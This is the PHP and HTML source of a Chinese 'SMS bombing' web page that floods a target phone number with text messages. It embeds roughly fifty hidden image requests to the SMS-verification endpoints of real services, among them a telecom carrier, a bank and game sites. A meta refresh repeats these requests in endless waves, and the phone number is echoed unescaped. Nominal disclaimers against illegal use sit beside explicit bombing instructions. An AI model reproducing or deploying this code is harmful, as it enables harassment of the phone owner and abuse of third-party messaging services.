<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>在线短信测压</title>
    <link rel="icon" href="https://static.kkk.plus/favicon/favicon.png" sizes="23x23" type="image/x-icon">
    <meta name="keywords" content="短信轰炸平台,免费短信轰炸,短信炸弹,云呼短信,云端短信,在线短信测压,短信攻击,电话轰炸">
    <meta name="description" content="短信轰炸平台,免费短信轰炸,短信炸弹,云呼短信,云端短信,在线短信测压,短信攻击,电话轰炸>
    <link href="http://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="http://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/plugins.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/oneui.css"> 
    <link rel="stylesheet" href="css/common.css">
    <script type="text/javascript" src="js/jquery-1.7.min.js"></script>
    <script src="js/modernizr.min.js"></script>
    
    <style>
        body {
            background-color: rgb(53, 54, 58)
            }
        .shuaibi-tip {
            background: #fafafa repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
            margin: 20px 0px;
            padding: 15px;
            border-radius: 5px;
            font-size: 14px;
            color: #555555;
            }
    </style>
</head>

<body>
<br>
<div class="col-xs-12 col-sm-10 col-md-8 col-lg-5 center-block" style="float: none;">

<!--弹出公告-->

<!--平台公告开始-->
<div class="modal fade" align="left" id="anounce" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header" style="background:linear-gradient(120deg, #31B404 0%, #D7DF01 100%);">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">╳</span><span class="sr-only">Close</span></button>
        <center><h4 class="modal-title" id="myModalLabel"><b><font color="#fff">在线短信轰炸说明</font></b></h4></center>  
      </div><div class="widget flat radius-bordered"> 
        <div class="widget-header bordered-top bordered-themesecondary"> <div class="modal-body">
           <p>

<li class="list-group-item"><span class="btn btn-info btn-xs">1</span> 本站完全免费提供使用，不保证短信接口的更新。</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">2</span> 请输入测试手机号点击启动后进行轰炸，可选择不同模式进行测压。
</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">3</span> 在提交手机号后，不要关闭本网页，系统会自动轰炸，轰炸过程中请勿关闭网页！</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">3</span> 平台不会记录你的任何访问数据，原理可以右键直接查看源代码或者在下面按钮点击下载本程序源码。</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">4</span> 平台每30秒会自动执行当前已经输入的手机号进行持续云呼轰炸!</li>

<div class="btn-group btn-group-justified">
<a target="_blank" class="btn btn-warning" href="https://chat.kkk.plus"><i class="fa fa-group"></i> 讨论</a>
<a target="_blank" class="btn btn-warning" href="https://www.kkk.plus/download/source-code/?project=WEB_PHP_SMS_Bomber_v2&version=20221128&from=E3XSJ1qe"><i class="fa fa-space-shuttle"></i> 源码下载</a>
<!--<a target="_blank" class="btn btn-danger" href=""><i class="fa fa-qq"></i> 联系客服</a>-->
</div></p></div></div></div>  
         <div class="modal-footer">  
        <button type="button" class="btn btn-default" data-dismiss="modal">我明白了</button>     
      </div>     
    </div>     
  </div>    
 </div>  
<!--公告-->

<div class="widget">
<!--logo-->
    <div class="widget-content themed-background-flat text-center" style="background-image:url(img/b3bf8e3c25dbbffaaee5ba769c4be844.jpg);background-size: 100% 100%;">
        <a href="javascript:void(0)">
			<!--<img src="img/35e822e5dd88e253c30dc9aba2db19fb.png" alt="Avatar" width="80" style="height: auto filter: alpha(Opacity=80);-moz-opacity: 0.80;opacity: 0.80;" class="img-circle img-thumbnail img-thumbnail-avatar-1x animated zoomInDown">-->
        </a>
    </div>
<!--logo-->
   <center>
<h2>     <a href="javascript:void(alert('在线短信测压，建议收藏到浏览器书签哦！'));"><b>在线短信轰炸</b></a></h2>
</center>
<!--logo下面按钮-->
	<div class="widget-content text-center">
		<div class="text-center text-muted">
			<div class="btn-group btn-group-justified">
				<div class="btn-group">
					<a class="btn btn-default" data-toggle="modal" href="#anounce"><i class="fa fa-bullhorn"></i>&nbsp;<span style="font-weight:bold">公告</span></a>
					</div>
					 	<a href="#lxkf" target="_blank" data-toggle="modal" class="btn btn-default"><i class="fa fa-qq"></i>&nbsp;<span style="font-weight:bold">客服</span></a>
			                <div class="btn-group">
                 <a href="light.php" class="btn btn-default" target="_blank"><i class="fa fa-rocket"></i>轻量版</a>
				</div>
             </div>
		</div>
	</div>
	<div class="list-group-item reed"><marquee scrollamount="5" direction="left" align="Middle" style="font-weight: bold;line-height: 20px;fo-size: 30px;color: #FF0000;">通知：随便折腾，力度不够可以使用多开模式，其他具体详情请点击公告查看！</marquee></div>
<!--logo下面按钮-->
</div>
<div class="panel panel-primary">
<div class="panel-heading"><class="panel-title"><i class="fa fa-bar-chart-o"></i>&nbsp;&nbsp;<font color="#cc9933"><b>黄金广告位<span style="color: #ff3030;">演示</font></b></font></div>
<table class="table table-bordered">
<tr>
<td style="text-align: center;"><a href="" target="_blank" ><span class="STYLE1" style="color: #0000cc;"><b><h6>广告1</h6></a></b></td>
<td style="text-align: center;"><a href="" target="_blank"><span class="STYLE1" style="color: #cc00cc;"><b><h6>广告2</h6></span></a></b></td>
<td style="text-align: center;"><a href="" target="_blank"><span class="STYLE1" style="color: #9f79ee;"><b><h6>广告3</h6></h6></span></a></b></td>
<td style="text-align: center;"><a href="" target="_blank"><span class="STYLE1" style="color: #8B1C62;"><b><h6>广告4</h6></span></a></b></td>
</tr>
<tr>
<td style="text-align: center;"><a href="" rel="nofollow" target="_blank"><span class="STYLE1" style="color: #FF0000;"><b><h6>广告5</h6></span></a></b></td>
<td style="text-align: center;"><a href="" rel="nofollow" target="_blank"><span class="STYLE1" style="color: #8B5A00;"> <b><h6>广告6</h6></span></a></b></td>
<td style="text-align: center;"><a href="" rel="nofollow" target="_blank"><span class="STYLE1" style="color: #008B00;"><b><h6>广告7</h6></span></a></b></td>
<td style="text-align: center;"><a href="" rel="nofollow" target="_blank"><span class="STYLE1"style="color: #EE9A00;"><b><h6>广告8</h6></span></a></b></td>
</tr>
</table>
</div>
<div class="block full2">
<!--TAB标签开始
	<div class="block-title">
        <ul class="nav nav-tabs" data-toggle="tabs">
            <li style="width: 25%;" align="center" class="active"><a href="#shop"><i class="fa fa-crosshairs"></i> <b>功能操作</b></a></li>
            <li style="width: 25%;" align="center" class><a href="#search" id="tab-query"><i class="fa fa-exclamation"></i> <b>问题解答</b></a></li>
			<li style="width: 25%;" align="center"><a href="#Substation"><font color="#FF4000"><i class="fa fa-smile-o fa-spin"></i> <b>关注本站</b></font></a></li>
            <li style="width: 25%;" align="center" class><a href="#more"><i class="fa fa-ellipsis-v"></i> <b>更多功能</b></a></li>
</ul>
    </div>
TAB标签结束-->
    <div class="tab-content">
<!--在线下单-->
    <div class="tab-pane active" id="shop">
    <!--图片广告开始
       <center><div class="shuaibi-tip animated tada  text-center"><a href="https://idc.hongchen.gold" target="_blank"><img src="/img/gg1.gif" style="width:100%;Height:90px;border-radius: 5px;padding: 0px;margin-top: 0px;margin-bottom: 1px;" alt="广告合作联系站长QQ：908819363"></a>
    图片广告结束-->
      </div><h7>
      <!--
      <span style="color:#009900;">本站仅限用于测试本机号码是否能收到电话＋收到短信，以及测试当前所在地信号网络短信＋电话功能是否能正常使用！</span></h7><p><span style="color:#ff0000;">如您使用本产品用于骚扰以及扰乱别人正常生活，用于不法行为以及危害别人的行为，您需要自行承担全部责任！一概与提供者无任何直接关系，如您使用即默认自动同意以上条款！</span></p>
      <a  data-toggle="modal" class="badge badge-primary"><font color="#FFFFFF"></font></a>--><hr></center> </b><div id="goodTypeContents">
									<div class="form-group" id="display_searchBar">
									<form method="GET" action="index.php">
				<div class="input-group"><div class="input-group-addon">手机号码</div>
				<input type="text"  class="form-control" placeholder="输入手机号码" name="hm" maxlength="11">
				
			</div></div>
						
			<div id="alert_frame" class="alert alert-success animated rubberBand" style="display:none;background: linear-gradient(to right,#71D7A2,#5ED1D7);font-weight: bold;color:white;">
			</div>
			<div style="text-align: center;"><button type="·" class="btn btn-primary" name="ok" onClick="ajaxRequest(0);">启动轰炸</button>
		        <button type="button" class="btn btn-info" onClick="top.location='index.php'">停止轰炸</button>
		        <button type="button" class="btn btn-info" onclick="top.location='super.html'">★多开模式</button>
		    </div>


<br>
					
		</div>
	</div>
	</form>
<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$d=$_GET['hm'];
?>
<?php
if($d>1){
	echo "<br /><div class='progress progress-striped active'>
            <div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div>
        </div>";
	echo "<center><h8><i class='glyphicon glyphicon-refresh text-info fa-spin'></i>&nbsp;<font color='#6699FF'>短信轰炸已启动,  对<strong>$d</strong>,已经发起第<strong>$a</strong>波短信-请静静的等待几秒钟查看效果,即将开始第下一波轰炸。<hr></h8></font></center>";
    echo "<div style='display:none'>
      <img src='http://zhengshi.qipeisq.com/regajax/sendsmsreg?mb=$d' alt='' />
<img src='http://shop.aimeilife.com/api/v5/Auth/SendVerification?phone=$d' alt='' />
<img src='https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone=$d&mpcode=&pwd=&tname=&idcard=' alt='' />
<img src='https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber=$d' alt='' />
<img src='https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile=$d&country_code=86' alt='' />
<img src='http://lemonwifi.cn/portal/verification.ajax?mobile=$d' alt='' />
<img src='https://uc.csdhe.com/v1/sms/send?mobile=$d&apptype=examWeb' alt='' />
<img src='http://www.cnppump.ltd/Service/UserHandler.ashx?cmd=GetTelVerifyCode4Regit&Tel=$d&Auth=da64c1884a2f4fa48a75a4d960bc12eb&SoftType=Web&_=1662043243269' alt='' />
<img src='https://www.yojiang.cn/api/user/send_verify_code?phone=$d' alt='' />
<img src='https://user.daojia.com/mobile/getcode?mobile=$d&newVersion=1&bu=101' alt='' />
<img src='https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=$d&appId=www_home&v=1&sig=&t=1662044138185&v=1' alt='' />
<img src='https://pass.cctalk.com/intraApi/v1/sms/send?action=SendMsg&mobile=%2B86-$d' alt='' />
<img src='https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=$d' alt='' />
<img src='https://h5.17k.com/ck/user/mobile/$d/message?smsType=1&appKey=1351550300' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=0' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=7' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=6' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=5' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=4' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=3' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=2' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=1' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=9' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=10' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=11' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=12' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=13' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=14' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=15' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=16' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=17' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=18' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=19' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=20' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=21' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=22' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=23' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=24' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=25' alt='' />
<img src='https://www.doc88.com/doc.php?act=send_sms&type=0&phone=$d' alt='' />
<img src='https://mobile.cmbchina.com/DUserManage/UserRegisterNew/URN_Register.aspx?$=1&PhoneNo=$d&ClientNo=f20c5365321b4411a0ae4aa8d5ddd608&Command=CMD_SENGMSGCODE' alt='' />
<img src='https://hapi.00bang.cn/llb/oauth/llb/getLoginSmsCode?mobile=$d' alt='' />
<img src='https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=$d&imgcode=&sendtype=quicklogin&hpquid=q22-j-14&user_domain=hj&sub_user_domain=&business_domain=yyy_class&callback=cbb467d8' alt='' />
<img src='https://www.tanwan.com/api/reg_json_2019.php?act=3&phone=$d&callback=jQuery112005094453070699978_1639928758626&_=1639928758629' alt='' />
<img src='https://www.tanwan.com/api/reg_json_2019.php?act=3&phone=$d&callback=jQuery112003247368730630804_1643269992344&_=1643269992347' alt='' />
<img src='https://changba.com/official_login.php?ac=start_phone_entry&phone=$d' alt='' />
<img src='https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone=$d&Captcha=&_=1627172292814' alt='' />
<img src='https://ershoucheapi.58.com/cheyuan/comm/smsCode.do?callback=jQuery17208815301240499984_1623173514122&phone=$d&code=send&_=1623173533089' alt='' />
</div>
	";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'>";
}else{
}
?>
<!--
<div class="tab-pane" id="search">
              <table class="table table-striped table-borderless table-vcenter remove-margin-bottom">
         <tbody>
            <tr class="shuaibi-tip animation-bigEntrance">
                <td class="text-center" style="width: 100px;">
                    <img src="http://q4.qlogo.cn/headimg_dl?dst_uin=908819363&spec=100" alt="avatar" class="img-circle img-thumbnail img-thumbnail-avatar">
                </td>
                <td>
                    <h4><strong>站长</strong></h4>
					<i class="fa fa-fw fa-qq text-primary"></i>908819363<br><i class="fa fa-fw fa-history text-danger"></i>问题请联系客服
                </td>
                <td class="text-right" style="width: 20%;">
                    <a href="#lxkf" target="_blank" data-toggle="modal" class="btn btn-sm btn-info">点击联系</a>
                </td>
            </tr>
         </tbody>
        </table>
		<br>
		
			<span class="label label-primary">事项1:</span> 本站永久免费提供，具体其他说明请点击公告查看！<p></p><p></p><span class="label label-success">事项2:</span> 输入号码点击轰炸即可开始轰炸<p></p><p></p><span class="label label-warning">事项3:</span> 关闭网页或者点击停止几分钟后即可停止轰炸<p></p><p></p><span class="label label-danger">事项4:</span> 请勿用于非法用途后果本站概不负责		</div>
			
					
            <br>
			<div id="result2" class="form-group" style="display:none;">
              <center><small><font color="#ff0000">手机用户可以左右滑动</font></small></center>
				
	
   </div> 

<div class="tab-pane animation-fadeInQuick2" id="Substation">
<table class="table table-borderless table-pricing">
            <tbody>
                
                <tr>
                    <td><img src="img/hz.png" width="280" height="280"/></td>
                </tr>
				
                
            </tbody>
        </table>
    
	</div>

<div class="tab-pane" id="more">
    <div class="row">
		
		<div class="col-sm-6">
            <a href="https://www.hcw3.cn" target="_blank" class="widget">
                <div class="widget-content themed-background-info text-right clearfix" style="color: #fff;">
                    <div class="widget-icon pull-left">
                        <i class="fa fa-apple"></i>
                    </div>
                    <h2 class="widget-heading h3">
                        <strong>红尘资源网</strong>
                    </h2>
                    <span>点击进入</span>
                </div>
            </a>
        </div>
	</div>
</div>
-->
<!--更多按钮结束-->
</div>
</div>




    <!--底部导航-->
    <div class="panel panel-default">
        <center>
            <div class="panel-body"><span>在线短信测压<i class="fa fa-heart text-danger"></i> 2023 | </span> <a href=""><span style="font-weight:bold">©️ Copyright</span></a> <br>            </div>
    </center></div>
    <!--底部导航-->
</div>

 <!--客服介绍开始-->
<div class="modal fade" align="left" id="lxkf" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
						<h4 class="modal-title" id="myModalLabel">官方客服联系页</h4>
					</div>
					<div class="modal-body">

				       <div class="tab-pane" id="search">
		        <ul class="list-group animated bounceIn">
                <li class="list-group-item">   
				   <div class="media">
				   <span class="pull-left thumb-sm"><img src="img/icon.png" alt="..." class="img-circle img-thumbnail img-avatar"></span>
                   <div class="pull-right push-15-t">
                            <a href="" target="_blank" class="btn btn-sm btn-info">你不会觉得真有客服吧</a>
                   </div>
                   <div class="pull-left push-10-t">
                        <div class="font-w600 push-5"><i class="fa fa-fw fa-qq text-primary"></i> &nbsp;</div>
                        <div class="font-w600 push-5"></div>
                   </div>
				   </div>
                </li>
	<li class="list-group-item" style="font-size: 12px;">
                <b>本站系统每30秒自动持续轰炸当前的手机号</b><br>
				</li>
<li class="list-group-item" style="font-size: 12px;">
                <b>关闭网页或者点击停止几分钟后即可停止轰炸</b><br>
<li class="list-group-item" style="font-size: 12px;">
                <b>请勿用于非法用途后果本站概不负责</b><br>
				</li>		
				</ul>   <div class="modal-footer">  
        <button type="button" class="btn btn-default" data-dismiss="modal">我明白了</button>     
      </div
					></div>
				</div>
			</div>
		</div>
	</div>

<!--联系客服结束-->

    
  

<!--音乐代码
<div id="audio-play" style="display:none;">
  <div id="audio-btn" class="on" onClick="audio_init.changeClass(this,'media')">
    <audio loop="loop" src id="media" preload="preload"></audio>
  </div>
</div>
-->

<script src="http://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="http://cdn.staticfile.org/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
<script src="http://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="http://cdn.staticfile.org/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
<script src="http://cdn.staticfile.org/layer/2.3/layer.js"></script>
<script src="js/app.js"></script>
<!--
<audio autoplay loop id="music">
<source src="https://www.hlapi.cn/api/wyrb" type="audio/mpeg">
</audio>
-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<!-- DT Time -->
<!--</body>-->
</body>
</html>
